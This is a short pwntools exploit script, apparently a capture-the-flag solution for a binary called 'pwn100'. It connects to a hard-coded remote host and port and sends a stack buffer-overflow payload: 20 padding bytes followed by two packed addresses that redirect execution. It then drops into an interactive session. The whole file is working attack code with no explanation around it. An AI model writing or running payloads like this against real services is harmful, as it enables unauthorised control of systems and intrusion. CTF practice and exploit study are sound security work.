from pwn import * 

r= remote("103.53.198.167" ,33335)
#r= process("./pwn100")
r.sendline("1024")
r.sendline("A"*20+p32(0x80499EC)+p32(0x0804857B))
r.interactive()
